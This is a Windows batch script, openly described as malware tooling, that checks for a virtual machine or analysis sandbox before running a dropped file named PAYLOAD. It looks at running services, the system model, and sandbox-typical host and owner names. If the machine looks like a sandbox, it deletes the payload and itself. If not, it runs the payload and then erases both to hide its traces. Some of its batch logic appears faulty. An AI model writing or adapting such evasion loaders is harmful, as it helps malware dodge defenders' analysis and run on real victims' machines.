@echo off

REM -----------------------------------------------------------------------------------
REM # Simple bat script to check the environment for signs of virtualization
REM # If signs of virtualization is found, the payload will be deleted.
REM # If the machine seems real, the payload is run and then the dropped file deleted from system.

REM # ** !!Important!! **
REM # Check PAYLOAD to the name of the payload to be run.
REM -----------------------------------------------------------------------------------

REM -------------------------------
REM # Checks for VMIService
REM -------------------------------

tasklist | findstr "vmicsvc" > svc.log
if exist svc.log (
for %%x in (svc.log) do if not %%~zx==0 (
	    del PAYLOAD
      del vcheck.bat
) else (
	    del svc.log
      systeminfo | findstr "Model:" > vm.log												
	    set /p var= < vm.log
	    del vm.log


REM -------------------------------
REM # Checks for the System model
REM -------------------------------       
      
	    if "%var%"=="System Model:              Virtual Machin" (
            del PAYLOAD
            del vcheck.bat
	    ) else (
		        if "%var%"=="System Model:              VMware7,1" (
			          del PAYLOAD
                del vcheck.bat
		        ) else (
                systeminfo | findstr "^Host Name:$" > name.log	
			          set /p name= < name.log
			          del name.log
		  ))

      
REM -------------------------------
REM # Checks the associated Host Name
REM -------------------------------
      
		  if "%name%"=="Host Name:                 USER-PC" (
			        del PAYLOAD
              del vcheck.bat
		  ) else (
			        if "%name%"=="Host Name:                 JOHN-PC" (
				            del PAYLOAD
                    del vcheck.bat
			        ) else (
				            systeminfo | findstr "Owner:" > own.log			
				            set /p own= < own.log
				            del own.log
		  ))
	
  
REM -------------------------------
REM # Checks the registered Owner
REM -------------------------------     
      
		  if "%own%"=="Registered Owner:          admin" (
			      del PAYLOAD
            del vcheck.bat
		  ) else (
			      if "%own%"=="Registered Owner:                 Windows User" (
			              del PAYLOAD
                    del vcheck.bat
			      ) else (
				            if "%own%"=="Registered Owner:                 John" (
					                 del PAYLOAD
                           del vcheck.bat
				    ) else (
					          start PAYLOAD
                    timeout 2
                    del PAYLOAD
                    del vcheck.bat
		        )))
	    )
)
